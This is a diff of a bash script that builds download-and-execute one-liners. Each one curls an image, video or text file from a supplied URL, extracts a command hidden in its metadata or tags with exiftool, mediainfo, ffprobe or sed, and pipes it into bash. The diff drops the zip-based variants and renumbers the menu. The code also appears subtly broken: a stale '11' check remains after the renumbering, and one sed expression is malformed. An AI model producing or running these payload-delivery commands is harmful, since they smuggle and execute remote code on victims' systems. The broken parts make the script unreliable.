@@ -49,7 +49,6 @@ fi
 
 command="$1"
 filename="$2"
-zip="$3"
 
 # For text files
 if [[ "$method_choice" == "11" ]]; then
@@ -70,18 +69,15 @@ echo "2. image-exiv2-one-liner"
 echo "3. image-identify-one-liner"
 echo "4. image-file-grep-one-liner"
 echo "5. image-jpeginfo-grep-one-liner"
-echo "6. image-exiftool-through-zip"
 
 echo "Execution methods compatible with video file format:"
-echo "7. video-exiftool-one-liner"
-echo "8. video-mediainfo-one-liner"
-echo "9. video-ffprobe-one-liner"
-echo "10. video-exiftool-through-zip"
+echo "6. video-exiftool-one-liner"
+echo "7. video-mediainfo-one-liner"
+echo "8. video-ffprobe-one-liner"
 
 echo "Execution methods compatible with text file format:"
-echo "11. text-sed-one-liner"
-echo "12. text-exiftool-through-zip"
-read -p "Enter the method number (1-12): " method_choice
+echo "9. text-sed-one-liner"
+read -p "Enter the method number (1-9): " method_choice
 
 case "$method_choice" in
     1)
@@ -115,44 +111,26 @@ case "$method_choice" in
         echo -e "$one_liner\e[0m"
         ;;
     6)
-        echo -e "\e[34mGenerating one-liner method with exiftool through zip..."
-        one_liner="curl -s '$url/$zip' | exiftool $zip / $filename -Comment -b - | bash"
-        echo "Generated one-liner:"
-        echo -e "$one_liner\e[0m"
-        ;;
-    7)
         echo -e "\e[34mGenerating one-liner method with exiftool..."
         one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
         echo "Generated one-liner:"
         echo -e "$one_liner\e[0m"
         ;;
-    8)
+    7)
         echo -e "\e[34mGenerating one-liner method with mediainfo..."
         one_liner="curl -s '$url/$filename' | mediainfo --Output="General;%Comment%" | bash"
         echo "Generated one-liner:"
         echo -e "$one_liner\e[0m"
         ;;
-    9)
+    8)
         echo -e "\e[34mGenerating one-liner method with ffprobe..."
         one_liner="curl -s '$url/$filename' | ffprobe -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash"
         echo "Generated one-liner:"
         echo -e "$one_liner\e[0m"
         ;;
-    10)
-        echo -e "\e[34mGenerating one-liner method with exiftool through zip..."
-        one_liner="curl -s '$url/$zip' | exiftool $zip / $filename -Comment -b - | bash"
-        echo "Generated one-liner:"
-        echo -e "$one_liner\e[0m"
-        ;;
-    11)
+    9)
         echo -e "\e[34mGenerating one-liner method with sed..."
         one_liner="curl -s '$url/$filename' | sed 's/<rs>//g' | sed 's/</rs>//' | bash"
-        echo "Generated one-liner:"
-        echo -e "$one_liner\e[0m"
-        ;;
-    12)
-        echo -e "\e[34mGenerating one-liner method with exiftool through zip..."
-        one_liner="curl -s '$url/$zip' | exiftool $zip / $filename -Comment -b - | bash"
         echo "Generated one-liner:"
         echo -e "$one_liner\e[0m"
         ;;
